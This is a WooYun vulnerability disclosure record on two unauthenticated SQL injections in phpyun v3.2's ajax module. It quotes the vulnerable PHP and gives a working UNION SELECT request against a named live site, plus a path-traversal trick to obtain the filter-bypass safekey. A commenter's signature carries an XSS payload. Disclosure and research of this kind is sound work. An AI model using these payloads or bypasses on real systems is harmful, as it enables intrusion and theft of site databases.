{"id": 41537, "wybug_id": "wooyun-2014-088478", "wybug_title": "phpyun v3.2 (20141222) 两处注入 (无需登录)", "wybug_corp": "php云人才系统", "wybug_author": "′雨。", "wybug_date": "2014-12-25 15:36", "wybug_open_date": "2015-03-25 15:38", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-29：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-02-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-25：\t细节向公众公开  简要描述： 直接出管理数据。 不需要盲注。 详细说明：  第一处 在model/ajax.class.php中\nfunction exchanges_action(){\t\t$_GET['page']=$_POST['page'];\t\t$where=$_POST['jobwhere'].\" ORDER BY `lastupdate` DESC\";//这里关键点, 可以看到前面还接了一个$_POST['jobwhere'] 。\t\t$urlarr['page']=\"{{page}}\";\t\t$pageurl=$this->url(\"index\",\"index\",$urlarr);\t\t\t$rows=$this->get_page(\"company_job\",$where,$pageurl,6,\"`id`,`name`,`uid`,`salary`,`edu`,`lastupdate`\");//这里把where带入查询。\t\t\t\t\tif($rows&&is_array($rows)){\t\t\tinclude(PLUS_PATH.\"com.cache.php\");\t\t\tif(count($rows)<6){\t\t\t\t$page=1;\t\t\t}else{\t\t\t\t$page=intval($_GET['page'])+1;\t\t\t}\t\t\t$html=\"<input type=\\\"hidden\\\" value='\".$page.\"' id='exchangep'/>\";\t\t\tforeach($rows as $key=>$val){\t\t\t\t$job_url=$this->config[sy_weburl].\"/\".$this->url(\"index\",\"com\",array(\"c\"=>\"comapply\",\"id\"=>$val[id]),\"1\");\t\t\t\t$time  = date(\"Y年m月d日\",$val['lastupdate']);\t\t\t\t$html.=\"<div class=\\\"index_job_list\\\"><div class=\\\"jobtit\\\"><a title=\\\"\".$val['name'].\"\\\" target=\\\"_blank\\\" href=\\\"\".$job_url.\"\\\">\".$val['name'].\"</a>\t\t\t\t<em class=\\\"endtime\\\">\".$time.\"</em></div><div class=\\\"award\\\"><span>薪资：\".$comclass_name[$val['salary']].\"</span><em> 学历：\".$comclass_name[$val['edu']].\"</em></div><div class=\\\"go\\\"><a target=\\\"_blank\\\" href=\\\"\".$job_url.\"\\\">查看职位>></a></div></div>\";\t\t\t}\t\t}\t\techo $html;die;//最后输出\n\nif($config['sy_istemplate']!='1' || md5(md5($config['sy_safekey']).$_GET['m'])!=$_POST['safekey'])//继续拿到safekey绕过过滤{   \tforeach($_POST  as $id=>$v){\t\t\t\t$str = html_entity_decode($v,ENT_QUOTES,\"GB2312\");\t\t\t\t$v = common_htmlspecialchars($id,$v,$str,$config);\t\t\t\tsafesql($id,$v,\"POST\",$config);\t\t\t\t$id = sfkeyword($id,$config);\t\t$v = sfkeyword($v,$config);\t\t$_POST[$id] = $v;\t}}\nhttp://www.hr135.com/company/index.php?m=index&c=index&id=3751&style=../../template/admin&tp=/admin_web_config然后计算一下拿到safekey再请求www.hr135.com/index.php/admin/?m=ajax&c=exchangesjobwhere=1=2 union select/**/1,0x48656C6C6F2070687079756E,3,4,5,6#&safekey=5f413c6ca895a192144c0182fc87af26\n\n因为demo有安全狗。。  懒得去搞了 直接union select 输出一个hello phpyun把。第二处 也是model/ajax.class.php中\nfunction Refresh_job_action()\t{\t\tif($_POST['ids']){\t\t\t$num=count($_POST['ids']);//统计下数目\t \t\t}else{\t\t\t$num=$this->obj->DB_select_num(\"company_job\",\"`state`='1' and `uid`='\".$this->uid.\"'\");\t\t}\t\tif($num==0)\t\t{\t\t\techo \"您暂无正常职位！\";die;\t\t}\t\t\t$statis=$this->obj->DB_select_once(\"company_statis\",\"`uid`='\".$this->uid.\"'\");\t\tif($statis['vip_etime']>time() || $statis['vip_etime']==\"0\")\t\t{\t\t\tif($statis['rating_type']==1)\t\t\t{\t\t\t\tif($statis['breakjob_num']>=$num){\t\t\t\t\t$value=\"`breakjob_num`=`breakjob_num`-$num\";\t\t\t\t\t$this->obj->DB_update_all(\"company_statis\",$value,\"`uid`='\".$this->uid.\"'\");\t\t\t\t}else{\t\t\t\t\tif($this->config['com_integral_online']==\"1\"){\t\t\t\t\t\t$integral=$this->config['integral_jobefresh']*($num-$statis['breakjob_num']);\t\t\t\t\t\tif($statis['integral']<$integral){\t\t\t\t\t\t\techo \"会员刷新职位数、\".$this->config['integral_pricename'].\"均不足！\";die;\t\t\t\t\t\t}else{\t\t\t\t\t\t\t$value=\"`breakjob_num`='0',`integral`=`integral`-$integral\";\t\t\t\t\t\t\t$this->obj->DB_update_all(\"company_statis\",$value,\"`uid`='\".$this->uid.\"'\");\t\t\t\t\t\t\t$this->insert_company_pay($integral,2,$this->uid,'批量刷新职位',1,8);\t\t\t\t\t\t}\t\t\t\t\t}else{\t\t\t\t\t\techo \"会员刷新职位数不足！\";die;\t\t\t\t\t}\t\t\t\t}\t\t\t}\t\t}else{\t\t\tif($this->config['com_integral_online']==\"1\"){\t\t\t\t$integral=$this->config['integral_jobefresh']*($num-$statis['breakjob_num']);\t\t\t\tif($statis['integral']<$integral){\t\t\t\t\techo \"会员刷新职位数、\".$this->config['integral_pricename'].\"均不足！\";die;\t\t\t\t}else{\t\t\t\t\t$value=\"`breakjob_num`='0',`integral`=`integral`-$integral\";\t\t\t\t\t$this->obj->DB_update_all(\"company_statis\",$value,\"`uid`='\".$this->uid.\"'\");\t\t\t\t\t$this->insert_company_pay($integral,2,$this->uid,'批量刷新职位',1,8);\t\t\t\t}\t\t\t}else{\t\t\t\techo \"会员刷新职位数不足！\";die;\t\t\t}\t\t}\t\tif($_POST['ids']!=\"\"){//这里关键点。  当post来的ids不为空的时候\t\t\t$ids=@implode(\",\",$_POST['ids']);\t\t//又组合成字符串 下面直接把组合成的字符串带入到了查询当中                // 而且组合成的字符串带入查询的时候并没有被单引号 所以可以注入\t\t\t$nid=$this->obj->DB_update_all(\"company_job\",\"`lastupdate`='\".time().\"'\",\"`id` in (\".$ids.\") and `uid`='\".$this->uid.\"'\");//注入点\t\t}else{\t\t\t$nid=$this->obj->DB_update_all(\"company_job\",\"`lastupdate`='\".time().\"'\",\"`status`='1' and `uid`='\".$this->uid.\"'\");\t\t}\n   漏洞证明：  \n\n   修复方案：  第一个限制一下。第二个用你们的pylode转型下把。   版权声明：转载请注明来源 ′雨。@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-12-26 17:34 厂商回复： 感谢您的提供，我们会尽快修复！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-25 15:55 |    \t\tbacktrack丶yao \t\t\t( 普通白帽子  |\t\t\t        Rank:290 漏洞数:107        | \"><img src=x onerror=alert(666666);> <im...)\t\t \n  ！！！    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}